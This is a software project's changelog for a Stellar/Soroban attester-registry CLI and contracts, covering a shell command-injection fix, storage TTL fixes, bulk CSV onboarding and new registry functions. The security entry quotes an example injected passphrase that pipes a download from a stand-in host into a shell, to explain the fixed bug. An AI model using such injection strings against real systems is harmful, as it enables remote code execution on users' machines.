# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Security

- **`lafiya-cli config env` command injection fix (issue #396).**
  Previously, `LAFIYA_RPC_URL`, `LAFIYA_ATTESTER_REGISTRY_ID`, and
  `LAFIYA_ATTESTATION_REGISTRY_ID` were printed unquoted, and
  `LAFIYA_NETWORK_PASSPHRASE` was formatted with Rust's `{:?}` Debug
  formatter which emits double-quoted strings — inside which the shell
  still expands `$(...)`, backticks, and `$VAR`.  A passphrase such as
  `Test $(curl -s evil.sh | sh) Network` would execute arbitrary commands
  in any shell that `eval`'d the output.  All values are now wrapped in
  POSIX single quotes (embedded `'` escaped as `'\''`), so the shell
  treats every character as a literal.
  `scripts/lib/config.sh` received the same fix via a new `shell_quote`
  helper and a `print_env_exports` function.

### Fixed

- **ARCH-01: `attester-registry` persistent storage TTL never extended
  (issue #04).** All state-mutating functions (`add_attester`,
  `add_attester_with_info`, `update_attester_info`, `add_attesters`,
  `suspend_attester`, `reinstate_attester`) now call
  `env.storage().persistent().extend_ttl(...)` on the `Attester(Address)`
  and `Suspended(Address)` keys they write, in addition to the
  already-present instance storage bumps.  Added two new constants —
  `PERSISTENT_BUMP_AMOUNT` (365 days / 6 307 200 ledgers) and
  `PERSISTENT_LIFETIME_THRESHOLD` (30 days / 518 400 ledgers) — that
  govern the per-attester persistent-entry rent window.  Without this
  fix, an allowlisted attester that was never touched by a subsequent
  admin operation would eventually have its storage entry evicted by
  Soroban's state-archival mechanism, causing `is_attester` to silently
  return `false` with no on-chain indication of why.

- **SEC-02: `multisig-account` had no path to extend its own TTL
  (issue #08).** Added a permissionless `keep_alive()` entry point that
  extends instance storage TTL without requiring authorization.
  `__check_auth` already bumps TTL on every authorized transaction, but
  an admin account used infrequently (e.g., once a month) could still
  have its `Threshold`/`Signer*` entries evicted between admin actions.
  `keep_alive()` lets off-chain monitoring jobs, cron scripts, or any
  caller prevent archival without needing a signer key.

### Added

- **`lafiya-cli attester import` — bulk CHW onboarding from CSV
  (issue #397).** New subcommand that reads a CSV of community health
  worker addresses (schema: `address,license_hash,region`), validates
  every row locally before touching the network (strkey checksum, 64-hex
  license hash, region charset), diffs against current chain state,
  groups new registrations into batches of ≤ 50, and writes a resumable
  JSON journal for crash recovery. `--dry-run` prints the full plan
  without submitting transactions; `--resume <journal>` reconciles
  previous journal entries on restart. New modules wired in:
  `crates/lafiya-cli/src/attester_import.rs` (CSV pipeline, diff, plan,
  journal, report), `crates/lafiya-cli/src/rpc_client.rs` (RPC client
  trait and native/stellar-cli stub implementations),
  `crates/lafiya-cli/src/signer.rs` (ed25519 signer abstraction).

- **`lafiya-cli config env --format <shell|dotenv|json>`** — operators can
  now avoid `eval` entirely by using `--format dotenv` with
  `set -a; source <(...)`, or `--format json` for scripting with `jq`.
- **`validate_passphrase`** in `lafiya-config` — rejects non-printable
  ASCII characters (control characters, null bytes) in
  `network_passphrase`.  Called by `config env` before any output is
  printed.

### Added

- ADR-0010 and a prototype release manifest: `scripts/generate_release_manifest.py`
  binds contract wasm hashes, storage schema versions, generated bindings, event
  schemas, and per-network deployment state into one JSON document
  (`docs/release-manifest/schema.json`), with `scripts/validate_release_manifest.py`
  and `scripts/check_manifest_compatibility.py` to validate it and let downstream
  repositories check compatibility before pinning a release. See
  `docs/adr/0010-release-manifest-and-compatibility.md`.
- GitHub issue templates: bug report, feature request, and a security
  report template that directs reporters to `SECURITY.md` instead of
  accepting inline disclosures.
- Pull request template with a checklist matching the expectations in
  `CONTRIBUTING.md` (`make check` passes, tests added or updated,
  `CHANGELOG.md` updated).
- `SECURITY.md` security policy with a private reporting channel.
- `attester-registry`: `update_attester_info`, an admin-authorized entry
  point for changing an already-allowlisted attester's metadata without
  re-enrolling it. Emits `AttesterInfoUpdated`, which is distinguishable
  from `AttesterAdded`, and fails with the new `Error::AttesterNotFound`
  when the attester is not currently allowlisted (never added, or since
  removed).
- `attester-registry`: `get_attester_status`, a combined read returning an
  attester's metadata together with its current suspension state in one
  call.
- `attester-registry`: `set_max_attesters` and `get_max_attesters`, an
  admin-configurable soft cap on the number of allowlisted attesters
  (defaulting to 50,000). `add_attester`/`add_attester_with_info` fail with
  the new `Error::AllowlistFull` when the allowlist is at capacity and the
  attester is not already present; lowering the cap never evicts existing
  attesters, it only blocks further additions.
- `attester-registry`: `suspend_attester` and `reinstate_attester`, admin-
  authorized entry points for temporarily blocking an allowlisted attester
  from attesting without removing it. Suspended attesters fail
  `is_attester` until reinstated; emits `AttesterSuspended` and
  `AttesterReinstated` respectively.
